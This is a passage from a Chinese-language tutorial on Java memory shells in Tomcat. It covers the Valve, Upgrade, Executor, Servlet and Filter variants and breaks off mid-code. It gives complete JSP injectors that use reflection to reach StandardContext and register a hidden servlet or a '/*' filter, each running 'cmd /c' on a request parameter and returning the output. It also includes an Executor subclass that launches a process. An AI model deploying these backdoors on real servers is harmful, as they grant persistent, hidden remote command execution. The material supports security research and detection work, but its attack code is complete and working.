那这样以来我们的思路就可以补充完整了，先反射获取`StandardContext`，然后编写一个恶意`Valve`，最后通过`StandardContext.getPipeline().addValve()`添加就可以了。当然，我们也可以反射获取`StandardPipeline`，然后再`addValve`，这样也是可以的。

## 2.14 Tomcat Upgrade介绍与打入内存马思路分析

### 2.14.1 编写一个简单的Tomcat Upgrade的demo

#### 2.14.1.1 利用SpringBoot搭建

我这里在之前的`Tomcat Valve`项目的基础上做了简单的修改，删除之前`test`目录下的`TestValve.java`，新建一个`TestUpgrade.java`：

```java
package org.example.valvememoryshelldemo.test;

import org.apache.coyote.*;
import org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler;
import org.apache.tomcat.util.net.SocketWrapperBase;
import org.springframework.context.annotation.Configuration;
import java.lang.reflect.Field;
import java.nio.ByteBuffer;

@Configuration
public class TestUpgrade implements UpgradeProtocol {
    @Override
    public String getHttpUpgradeName(boolean b) {
        return "hello";
    }

    @Override
    public byte[] getAlpnIdentifier() {
        return new byte[0];
    }

    @Override
    public String getAlpnName() {
        return null;
    }

    @Override
    public Processor getProcessor(SocketWrapperBase<?> socketWrapperBase, Adapter adapter) {
        return null;
    }

    @Override
    public InternalHttpUpgradeHandler getInternalUpgradeHandler(SocketWrapperBase<?> socketWrapper, Adapter adapter, Request request) {
        return null;
    }

    public boolean accept(org.apache.coyote.Request request) {

        try {
            Field response = org.apache.coyote.Request.class.getDeclaredField("response");
            response.setAccessible(true);
            Response resp = (Response) response.get(request);
            resp.doWrite(ByteBuffer.wrap("\n\nHello, this my test Upgrade!\n\n".getBytes()));
        } catch (Exception ignored) {}
        return false;
    }
}
```

然后修改`TestConfig.java`如下：

```java
package org.example.valvememoryshelldemo.test;

import org.springframework.boot.web.embedded.tomcat.TomcatServletWebServerFactory;
import org.springframework.boot.web.server.WebServerFactoryCustomizer;
import org.springframework.stereotype.Component;

@Component
public class TestConfig implements WebServerFactoryCustomizer<TomcatServletWebServerFactory> {

    @Override
    public void customize(TomcatServletWebServerFactory factory) {
        factory.addConnectorCustomizers(connector -> {
            connector.addUpgradeProtocol(new TestUpgrade());
        });
    }
}
```

运行之后命令行执行命令`curl -H "Connection: Upgrade" -H "Upgrade: hello" http://localhost:8080`，效果如下：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240131011203184.png)

#### 2.14.1.2 利用Tomcat搭建

当然也是可以利用`Tomcat`来搭建的，只需要`TestUpgrade.java`即可，因为里面含有定义的`servlet`逻辑：

```java
package org.example;

import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.connector.Request;
import org.apache.coyote.Adapter;
import org.apache.coyote.Processor;
import org.apache.coyote.UpgradeProtocol;
import org.apache.coyote.Response;
import org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler;
import org.apache.tomcat.util.net.SocketWrapperBase;
import java.lang.reflect.Field;
import java.nio.ByteBuffer;

@WebServlet("/evil")
public class TestUpgrade extends HttpServlet {

    static class MyUpgrade implements UpgradeProtocol {
        @Override
        public String getHttpUpgradeName(boolean b) {
            return null;
        }

        @Override
        public byte[] getAlpnIdentifier() {
            return new byte[0];
        }

        @Override
        public String getAlpnName() {
            return null;
        }

        @Override
        public Processor getProcessor(SocketWrapperBase<?> socketWrapperBase, Adapter adapter) {
            return null;
        }

        @Override
        public InternalHttpUpgradeHandler getInternalUpgradeHandler(SocketWrapperBase<?> socketWrapperBase, Adapter adapter, org.apache.coyote.Request request) {
            return null;
        }

        @Override
        public boolean accept(org.apache.coyote.Request request) {
            try {
                Field response = org.apache.coyote.Request.class.getDeclaredField("response");
                response.setAccessible(true);
                Response resp = (Response) response.get(request);
                resp.doWrite(ByteBuffer.wrap("Hello, this my test Upgrade!".getBytes()));
            } catch (Exception ignored) {}
            return false;
        }
    }
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
        try {
            RequestFacade rf = (RequestFacade) req;
            Field requestField = RequestFacade.class.getDeclaredField("request");
            requestField.setAccessible(true);
            Request request1 = (Request) requestField.get(rf);
            new MyUpgrade().accept(request1.getCoyoteRequest());
        } catch (Exception ignored) {}
    }
}
```

效果如下：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240131151112722.png)

### 2.14.2 Tomcat Upgrade内存马介绍与相关代码调试分析

这部分主要参考了`Sndav`师傅的文章（原文地址为`https://tttang.com/archive/1709/`，但是由于图片链接挂掉导致图片无法显示，我们可以访问如下地址查看：`https://web.archive.org/web/20220823040415/https://tttang.com/archive/1709/`）以及`p4d0rn`师傅的文章（`https://p4d0rn.gitbook.io/java/memory-shell/tomcat-middlewares/upgrade`）。

和之前所提到的`Spring Interceptor`型内存马有点类似，在渗透过程中，尽管我们打入了内存马，但是因为原有的Filter包含鉴权或者其他功能，可能会导致我们的内存马无法访问，或者因为反向代理而导致我们无法找到对应的路径，这就需要我们在到`Filter`这一步之前就得打入内存马。

这里，我引用码哥字节文章（`https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09`）里面的一张`Tomcat`架构图：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/20200725210507.png)

可以清楚地看到，在此之前还有`Executor`和`Processor`两个模块，本节内容主要讨论后者，在下节中我们会讨论前者。

这一部分需要更加完备的`Tomcat`的相关知识，不再满足于之前的四个容器，关于这些基础知识的学习，强烈建议看码哥字节的文章，写的确实特别的好：

> https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09

其实在之前学习`Tomcat Valve`的过程中，当时我是一步步`step over`跟完了所有的代码的，我当时也提了一嘴`Http11Processor`。我们还是以当时的项目为例来看。

我们还是在`StandardHostValve.java`的这行打上断点：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130233028436.png)

从上面我红色箭头所指出的地方就可以看到调用到了`process`函数，具体调用位置位于`org.apache.coyote.AbstractProcessorLight#process`，我们跟过去看看：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130233124074.png)

可以看到，如果当前`SocketWrapperBase`的状态是`OPEN_READ`的时候，才会调用对应的`processor`去处理（第二张图的`process`调用的位置可以通过第一张图左下角的那个`process`的后一个`process`点进去看到）：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130233206768.png)

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130233758378.png)

我们继续`step into`这里的`service`方法看看：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130234010670.png)

继续`step over`，可以看到这里在检查`header`中的`Connection`头中是否为`upgrade`，这一点可以通过`step into`这个`isConnectionToken`方法看到：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130234324083.png)

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130234424354.png)

之后干两件事情：一是调用`getUpgradeProtocol`方法根据`upgradedName`从`httpUpgradeProtocols`拿到`UpgradeProtocol`；二是调用`UpgradeProtocol`对象的`accept`方法：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130234624306.png)

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130234945666.png)

到了这里，我们似乎可以建立起一个猜想，和之前介绍的内存马类似，我们只要构造一个恶意的`UpgradeProtocol`，然后把它插入到`httpUpgradeProtocols`。

由于`httpUpgradeProtocols`是一个`hashmap`，那么向里面添加的话用到的肯定是`put`方法，直接搜`httpUpgradeProtocols.put`：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240131143446951.png)

我们在这行打上断点，然后调试，发现在我们没有执行`curl -H "Connection: Upgrade" -H "Upgrade: hello" http://localhost:8080`这条命令之前，断点就到了，也就是说，`httpUpgradeProtocols.put`这个事情是发生在`tomcat`启动的时候的。

那这样一来，思路就更加具体了一点：反射找到`httpUpgradeProtocols`，把恶意`upgradeProtocol`插入进去即可构成`upgrade`内存马，思路和之前是一模一样的。

那现在只需要解决最后一个问题——如何找到`httpUpgradeProtocols`的位置。我们打开之前用`tomcat`搭建的`Tomcat Upgrade`的`demo`，在如下位置打下断点，然后执行命令`curl -H "Connection: Upgrade" -H "Upgrade: hello" http://localhost:8080/evil`进入断点调试：：
![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240131151457146.png)

`step over`一步即可在下方看到`request1`属性：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240131151614135.png)

然后在`request1`里面的`connector`的`protocolHandler`里面发现了`httpUpgradeProtocols`：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240131151700530.png)

接下来就是一步步地反射了。

## 2.15 Tomcat Executor内存马介绍与打入内存马思路分析

### 2.15.1 

新建一个项目，配置好`tomcat`运行环境和`web`目录，然后新建以下两个文件，第一个是TestExecutor.java：

```java
package org.example;

import java.io.IOException;
import java.util.concurrent.SynchronousQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

public class TestExecutor extends ThreadPoolExecutor {

    public TestExecutor() {
        super(0, Integer.MAX_VALUE, 60L, TimeUnit.SECONDS, new SynchronousQueue<>());
    }

    @Override
    public void execute(Runnable command) {
        try {
            Runtime.getRuntime().exec("calc.exe");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
        super.execute(command);
    }
}
```

第二个是`TestServlet.java`：

```java
package org.example;

import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@WebServlet("/test")
public class TestServlet extends HttpServlet {
    TestExecutor executor = new TestExecutor();

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
        executor.execute(() -> {
            System.out.println("Execute method triggered by accessing /test");
        });
    }
}
```

然后访问浏览器对应`context`下的`test`路由：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202165507597.png)

### 2.15.2 Tomcat Executor内存马介绍与代码调试分析

在`2.14.2`节中，我们聊到过可以在`Executor`模块中打入内存马，本节就来分析具体流程。本节主要参考文章为以下四篇：

> https://p4d0rn.gitbook.io/java/memory-shell/tomcat-middlewares/executor
>
> https://cjlusec.ldxk.edu.cn/2023/02/15/Executor/
>
> https://xz.aliyun.com/t/11593
>
> https://xz.aliyun.com/t/11613

在我之前提到过的讲tomcat架构的基础文章（`https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09`），有详细地讲述`ProtocolHandler`组件中的`EndPoint`部件，如果之前没有看完整地可以再去看下。里面这张图画的很好，我这里作引用：

![](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/image/NioEndPoint.jpg)

#### 2.15.2.1 Endpoint五大组件

如下表所示：

|       组件        |                     描述                     |
| :---------------: | :------------------------------------------: |
|   `LimitLatch`    |          连接控制器，控制最大连接数          |
|    `Acceptor`     |  接收新连接并返回给`Poller`的`Channel`对象   |
|     `Poller`      | 监控`Channel`状态，类似于`NIO`中的`Selector` |
| `SocketProcessor` |       封装的任务类，处理连接的具体操作       |
|    `Executor`     |     `Tomcat`自定义线程池，用于执行任务类     |

#### 2.15.2.2 Endpoint分类

`EndPoint`接口的具体实现类为`AbstractEndpoint`，`AbstractEndpoint`具体的实现类有`AprEndpoint`、`Nio2Endpoint`、`NioEndpoint`：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240131231807324.png)

|    Endpoint    |                简要解释                 |              Tomcat 源码位置              |
| :------------: | :-------------------------------------: | :---------------------------------------: |
| `AprEndpoint`  | 使用`APR`模式解决异步`IO`问题，提高性能 | `org.apache.tomcat.util.net.AprEndpoint`  |
| `Nio2Endpoint` |          使用代码实现异步`IO`           | `org.apache.tomcat.util.net.Nio2Endpoint` |
| `NioEndpoint`  |      使用`Java NIO`实现非阻塞`IO`       | `org.apache.tomcat.util.net.NioEndpoint`  |

上面所提到的`tomcat`，指的是如下`pom`依赖：

```xml
<dependency>
    <groupId>org.apache.tomcat</groupId>
    <artifactId>tomcat-coyote</artifactId>
    <version>9.0.83</version>
</dependency>
```

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240131232445734.png)

`Tomcat`默认启动是以`NioEndpoint`来启动的，它是`Tomcat`中默认的负责使用`NIO`方式进行网络通信功能的模块，它负责监听处理请求连接，并将解析出的字节流传递给`Processor`进行后续的处理。

#### 2.15.2.3 Executor相关代码分析

点开`Executor.java`即可看到有一个`execute`方法：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202145324525.png)
`Ctrl+Alt+F7`追踪即可看到这个`Executor`接口在`AbstractEndpoint`这个抽象类中有相关实现：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202145530939.png)

在`AbstractEndpoint.java`中搜索`executor`，往下翻即可看到有`setExecutor`和`getExecutor`这两个函数：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202145641729.png)

查看`getExecutor`函数的调用位置，发现就在该文件中有一个关键调用：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202145839900.png)

跟过去：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202145913789.png)

从下面这篇文章中我们可以知道`processSocket`在`Tomcat`运行过程中的作用：

> https://blog.51cto.com/u_8958931/2817418

那此时我们就有一个想法，如果我能控制`executor`，我把原来的`executor`通过`setExecutor`变成我恶意创建的`executor`，然后再通过这后面的`executor.execute`（`org.apache.tomcat.util.threads.ThreadPoolExecutor#execute(java.lang.Runnable)`）一执行就可以加载我们的恶意逻辑了。

但是现在有一个很头疼的问题，那就是标准的`ServletRequest`需要经过`Adapter`的封装后才可获得，这里还在`Endpoint`阶段，其后面封装的`ServletRequest`和`ServletResponse`无法直接获取。

那怎么办呢？结合之前学过的知识，我们很容易想到在之前我们第一次接触`java-object-researcher`的时候，`c0ny1`师傅写的这篇文章：

> ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202165813229.png)
>
> http://gv7.me/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/
>
> ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202165719046.png)

那就试试看呗，我们导入`jar`包到项目之后修改`TestServlet.java`代码如下：

```java
package org.example;

import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import me.gv7.tools.josearcher.entity.Blacklist;
import me.gv7.tools.josearcher.entity.Keyword;
import me.gv7.tools.josearcher.searcher.SearchRequstByBFS;
import java.util.ArrayList;
import java.util.List;

@WebServlet("/test")
public class TestServlet extends HttpServlet {
    TestExecutor executor = new TestExecutor();

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
        executor.execute(() -> {
            System.out.println("Execute method triggered by accessing /test");
        });
        List<Keyword> keys = new ArrayList<>();
        keys.add(new Keyword.Builder().setField_type("request").build());
        List<Blacklist> blacklists = new ArrayList<>();
        blacklists.add(new Blacklist.Builder().setField_type("java.io.File").build());
        SearchRequstByBFS searcher = new SearchRequstByBFS(Thread.currentThread(),keys);
        searcher.setBlacklists(blacklists);
        searcher.setIs_debug(true);
        searcher.setMax_search_depth(10);
        searcher.setReport_save_path("D:\\javaSecEnv\\apache-tomcat-9.0.85\\bin");
        searcher.searchObject();
    }
}
```

接着访问路由，然后在控制台输出中搜索`request = `：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202170116366.png)

直接搜索到了这条链：

```
TargetObject = {org.apache.tomcat.util.threads.TaskThread} 
  ---> group = {java.lang.ThreadGroup} 
   ---> threads = {class [Ljava.lang.Thread;} 
    ---> [15] = {java.lang.Thread} 
     ---> target = {org.apache.tomcat.util.net.NioEndpoint$Poller} 
      ---> this$0 = {org.apache.tomcat.util.net.NioEndpoint} 
       ---> connections = {java.util.Map<U, org.apache.tomcat.util.net.SocketWrapperBase<S>>} 
        ---> [java.nio.channels.SocketChannel[connected local=/0:0:0:0:0:0:0:1:8080 remote=/0:0:0:0:0:0:0:1:10770]] = {org.apache.tomcat.util.net.NioEndpoint$NioSocketWrapper} 
         ---> socket = {org.apache.tomcat.util.net.NioChannel} 
          ---> appReadBufHandler = {org.apache.coyote.http11.Http11InputBuffer} 
            ---> request = {org.apache.coyote.Request}
```

我们来验证一下，在`org/apache/tomcat/util/net/NioEndpoint.java`的这里下断点，不断`step over`，就可以找到这里的`request`的位置：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202170622846.png)

点开这里的`byteBuffer`，可以看到它是一个字节数组，右键找到`View as ... String`即可变成字符串：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202170930400.png)

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202171007974.png)

再点击上面我指出来的`View Text`即可清楚看到具体内容：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202171042514.png)

这就意味着我们可以把命令作为`header`的一部分传入，再把结果作为`header`的一部分传出即可。

# 三、传统Web型内存马

## 3.1 Servlet内存马

### 3.1.1 简单的servlet内存马demo编写

根据我们在上面的`2.3`节中的分析可以得出以下结论：

如果我们想要写一个`Servlet`内存马，需要经过以下步骤：

- 找到`StandardContext`
- 继承并编写一个恶意`servlet`
- 创建`Wapper`对象
- 设置`Servlet`的`LoadOnStartUp`的值
- 设置`Servlet`的`Name`
- 设置`Servlet`对应的`Class`
- 将`Servlet`添加到`context`的`children`中
- 将`url`路径和`servlet`类做映射

由以上结论我们可以写出如下内存马`demo`：

```jsp
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="javax.servlet.Servlet" %>
<%@ page import="javax.servlet.ServletConfig" %>
<%@ page import="javax.servlet.ServletContext" %>
<%@ page import="javax.servlet.ServletRequest" %>
<%@ page import="javax.servlet.ServletResponse" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="java.io.PrintWriter" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>MemoryShellInjectDemo</title>
</head>
<body>
<%
    try {
        ServletContext servletContext = request.getSession().getServletContext();
        Field appctx = servletContext.getClass().getDeclaredField("context");
        appctx.setAccessible(true);
        ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
        Field stdctx = applicationContext.getClass().getDeclaredField("context");
        stdctx.setAccessible(true);
        StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
        String servletURL = "/" + getRandomString();
        String servletName = "Servlet" + getRandomString();
        Servlet servlet = new Servlet() {
            @Override
            public void init(ServletConfig servletConfig) {}
            @Override
            public ServletConfig getServletConfig() {
                return null;
            }
            @Override
            public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws IOException {
                String cmd = servletRequest.getParameter("cmd");
                {
                    InputStream in = Runtime.getRuntime().exec("cmd /c " + cmd).getInputStream();
                    Scanner s = new Scanner(in, "GBK").useDelimiter("\\A");
                    String output = s.hasNext() ? s.next() : "";
                    servletResponse.setCharacterEncoding("GBK");
                    PrintWriter out = servletResponse.getWriter();
                    out.println(output);
                    out.flush();
                    out.close();
                }
            }
            @Override
            public String getServletInfo() {
                return null;
            }
            @Override
            public void destroy() {
            }
        };
        Wrapper wrapper = standardContext.createWrapper();
        wrapper.setName(servletName);
        wrapper.setServlet(servlet);
        wrapper.setServletClass(servlet.getClass().getName());
        wrapper.setLoadOnStartup(1);
        standardContext.addChild(wrapper);
        standardContext.addServletMappingDecoded(servletURL, servletName);
        response.getWriter().write("[+] Success!!!<br><br>[*] ServletURL:&nbsp;&nbsp;&nbsp;&nbsp;" + servletURL + "<br><br>[*] ServletName:&nbsp;&nbsp;&nbsp;&nbsp;" + servletName + "<br><br>[*] shellURL:&nbsp;&nbsp;&nbsp;&nbsp;http://localhost:8080/test" + servletURL + "?cmd=echo 世界，你好！");
    } catch (Exception e) {
        String errorMessage = e.getMessage();
        response.setCharacterEncoding("UTF-8");
        PrintWriter outError = response.getWriter();
        outError.println("Error: " + errorMessage);
        outError.flush();
        outError.close();
    }
%>
</body>
</html>
<%!
    private String getRandomString() {
        String characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        StringBuilder randomString = new StringBuilder();
        for (int i = 0; i < 8; i++) {
            int index = (int) (Math.random() * characters.length());
            randomString.append(characters.charAt(index));
        }
        return randomString.toString();
    }
%>
```

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240116000634170.png)

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240116001219456.png)

访问，执行任意命令：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240116001239119.png)

### 3.1.2 servlet内存马demo代码分析

先完成第一个任务：找到`StandardContext`，代码如下：

```java
ServletContext servletContext = request.getSession().getServletContext();
Field appctx = servletContext.getClass().getDeclaredField("context");
appctx.setAccessible(true);
ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
Field stdctx = applicationContext.getClass().getDeclaredField("context");
stdctx.setAccessible(true);
StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
```

首先得知道`Field`是什么。在`Java`中，`Field`这个类属于`java.lang.reflect`包，用于表示类的成员变量（字段）。`Field`类提供了访问和操作类的字段的方法，包括获取字段的名称、类型、修饰符等信息，以及在实例上获取或设置字段的值。这样我们就可以实现在运行时动态获取类的信息，绕过一些访问修饰符的限制，访问和操作类的私有成员。

所以上述代码的含义就是：从当前`HttpServletRequest`中获取`ServletContext`对象，然后使用反射机制获取`ServletContext`类中名为`context`的私有字段，并赋值给`Field`类型的变量`appctx`，把这个变量的属性设置为可访问，这样我们后续可以通过反射获取它的值。接着通过反射获取`ServletContext`对象的私有字段`context`的值，并将其强制类型转换为`ApplicationContext`。接下来继续使用反射机制获取`ApplicationContext`类中名为`context`的私有字段，并赋值给`Field`类型的变量`stdctx`，同样将其设置为可访问；最后通过反射获取`ApplicationContext`对象的私有字段`context`的值，并将其强制类型转换为`StandardContext`，到这里，我们就成功找到了`StandardContext`。

接着完成第二个任务：继承并编写一个恶意`servlet`，代码如下：

```java
Servlet servlet = new Servlet() {
    @Override
    public void init(ServletConfig servletConfig) {}
    @Override
    public ServletConfig getServletConfig() {
        return null;
    }
    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws IOException {
        String cmd = servletRequest.getParameter("cmd");
        {
            InputStream in = Runtime.getRuntime().exec("cmd /c " + cmd).getInputStream();
            Scanner s = new Scanner(in, "GBK").useDelimiter("\\A");
            String output = s.hasNext() ? s.next() : "";
            servletResponse.setCharacterEncoding("GBK");
            PrintWriter out = servletResponse.getWriter();
            out.println(output);
            out.flush();
            out.close();
        }
    }
    @Override
    public String getServletInfo() {
        return null;
    }
    @Override
    public void destroy() {
    }
};
```

可以看到，除了`service`代码之外，我们还编写了`init`、`getServletConfig`、`getServletInfo`和`destroy`方法，可是它们并没有用到，要么返回`null`，要么直接留空不写，那我们为什么还要写这四个方法呢？

那我们就来试试看注释掉之后会怎么样：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240116141041681.png)

报错：`Class 'Anonymous class derived from Servlet' must implement abstract method 'init(ServletConfig)' in 'Servlet'`。

我们直接跟进`Servlet`类，可以看到其是一个接口：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240116141210781.png)

原来，在`Java`中，接口中的方法默认都是抽象的，除非在`Java 8`及以后的版本中使用了默认方法。并且，如果一个类实现了某个接口，那么它必须提供该接口中所有抽象方法的具体实现，这就是我们必须要写出上述四个方法的原因。

这里我使用`cmd /c`来实现可以执行带有空格的命令，例如我在`3.1.1`中举例的`echo 世界，你好！`；对于`Linux`系统，那就是`/bin/sh -c`；接着就是关于输入或者返回结果中带有中文的情况的处理，我们需要设置编码为`GBK`即可，当然这个就需要具体情况具体对待了。

接着我们需要完成后续的六个任务：创建`Wapper`对象、设置`Servlet`的`LoadOnStartUp`的值、设置`Servlet`的`Name`、设置`Servlet`对应的`Class`、将`Servlet`添加到`context`的`children`中、将`url`路径和`servlet`类做映射，代码如下：

```java
Wrapper wrapper = standardContext.createWrapper();
wrapper.setName(servletName);
wrapper.setServlet(servlet);
wrapper.setServletClass(servlet.getClass().getName());
wrapper.setLoadOnStartup(1);
standardContext.addChild(wrapper);
standardContext.addServletMappingDecoded(servletURL, servletName);
```

前面几步在之前已经讲过了，这个`standardContext.addChild(wrapper);`是为了让我们自定义的`servlet`成为`Web`应用程序的一部分；然后`standardContext.addServletMappingDecoded(servletURL, servletName);`也可以写成如下形式：

```java
// 要引入：<%@ page import="org.apache.catalina.core.ApplicationServletRegistration" %>
ServletRegistration.Dynamic dynamic = new ApplicationServletRegistration(wrapper, standardContext);
dynamic.addMapping(servletURL);
```

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240116143224121.png)

### 3.1.3 关于StandardContext、ApplicationContext、ServletContext的理解

请参考`Skay`师傅和`yzddmr6`师傅的文章，他们写的非常详细，这里直接贴出链接：

> https://yzddmr6.com/posts/tomcat-context/
>
> https://mp.weixin.qq.com/s/BrbkTiCuX4lNEir3y24lew

引用`Skay`师傅的一句话总结：

`ServletContext`是`Servlet`规范；`org.apache.catalina.core.ApplicationContext`是`ServletContext`的实现；`org.apache.catalina.Context`接口是`tomcat`容器结构中的一种容器，代表的是一个`web`应用程序，是`tomcat`独有的，其标准实现是`org.apache.catalina.core.StandardContext`，是`tomcat`容器的重要组成部分。

关于`StandardContext`的获取方法，除了本文中提到的将我们的`ServletContext`转为`StandardContext`从而获取`context`这个方法，还有以下两种方法：

> 1. 从线程中获取StandardContext，参考Litch1师傅的文章：https://mp.weixin.qq.com/s/O9Qy0xMen8ufc3ecC33z6A
> 2. 从MBean中获取，参考54simo师傅的文章：https://scriptboy.cn/p/tomcat-filter-inject/，不过这位师傅的博客已经关闭了，我们可以看存档：https://web.archive.org/web/20211027223514/https://scriptboy.cn/p/tomcat-filter-inject/
> 3. 从spring运行时的上下文中获取，参考 LandGrey@奇安信观星实验室 师傅的文章：https://www.anquanke.com/post/id/198886

这两种方法，如果后面有时间的话我会补充完整。

## 3.2 Filter内存马

### 3.2.1 简单的filter内存马demo编写

根据我们在上面的`2.6`节中所讨论的内容，我们可以得出以下结论：

如果我们想要写一个`Filter`内存马，需要经过以下步骤：

> 参考：https://longlone.top/安全/java/java安全/内存马/Tomcat-Filter型/

- 获取`StandardContext`；
- 继承并编写一个恶意`filter`；
- 实例化一个`FilterDef`类，包装`filter`并存放到`StandardContext.filterDefs`中；
- 实例化一个`FilterMap`类，将我们的`Filter`和`urlpattern`相对应，使用`addFilterMapBefore`存放到`StandardContext.filterMaps`中；
- 通过反射获取`filterConfigs`，实例化一个`FilterConfig`（`ApplicationFilterConfig`）类，传入`StandardContext`与`filterDefs`，存放到`filterConfig`中。

> 参考：https://tyaoo.github.io/2021/12/06/Tomcat内存马/

需要注意的是，一定要先修改`filterDef`，再修改`filterMap`，不然会抛出找不到`filterName`的异常。

由以上结论我们可以写出如下内存马`demo`：

```jsp
<%@ page import="java.lang.reflect.*" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.util.Map" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="java.io.*" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="java.util.List" %>
<%@ page import="java.util.ArrayList" %>
<%
    ServletContext servletContext = request.getSession().getServletContext();
    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
    Field filterConfigsField = standardContext.getClass().getDeclaredField("filterConfigs");
    filterConfigsField.setAccessible(true);
    Map filterConfigs = (Map) filterConfigsField.get(standardContext);
    String filterName = getRandomString();
    if (filterConfigs.get(filterName) == null) {
        Filter filter = new Filter() {
            @Override
            public void init(FilterConfig filterConfig) {
            }

            @Override
            public void destroy() {
            }

            @Override
            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;
                String cmd = httpServletRequest.getParameter("cmd");
                {
                    InputStream in = Runtime.getRuntime().exec("cmd /c " + cmd).getInputStream();
                    Scanner s = new Scanner(in, "GBK").useDelimiter("\\A");
                    String output = s.hasNext() ? s.next() : "";
                    servletResponse.setCharacterEncoding("GBK");
                    PrintWriter out = servletResponse.getWriter();
                    out.println(output);
                    out.flush();
                    out.close();
                }
                filterChain.doFilter(servletRequest, servletResponse);
            }
        };
        FilterDef filterDef = new FilterDef();
        filterDef.setFilterName(filterName);
        filterDef.setFilterClass(filter.getClass().getName());
        filterDef.setFilter(filter);
        standardContext.addFilterDef(filterDef);
        FilterMap filterMap = new FilterMap();
        filterMap.setFilterName(filterName);
        filterMap.addURLPattern("/*");
        filterMap.setDispatcher(DispatcherType.REQUEST.name());
